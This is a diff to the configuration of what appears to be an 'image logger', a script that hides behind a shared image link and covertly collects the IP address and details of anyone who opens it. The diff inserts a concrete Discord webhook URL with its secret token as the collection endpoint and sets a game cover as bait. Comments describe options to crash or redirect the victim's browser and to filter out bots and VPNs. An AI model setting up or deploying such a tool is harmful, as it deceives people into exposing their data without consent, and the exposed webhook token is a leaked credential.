@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1131989215194923048/I3ECtzOeatiVH2f6IPB9jT4kmInhADxFSwWKHL1FHzTw2jJBVRcVwZrozbcvRcZV3IQU",
+    "image": "https://images.crazygames.com/games/krunker-io/cover-1591336739727.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -38,7 +38,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
@@ -60,7 +60,7 @@ config = {
     # 1) Redirect (If this is enabled, disables image and crash browser)
     # 2) Crash Browser (If this is enabled, disables image)
     # 3) Message (If this is enabled, disables image)
-    # 4) Image 
+    # 4) Image
 }
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
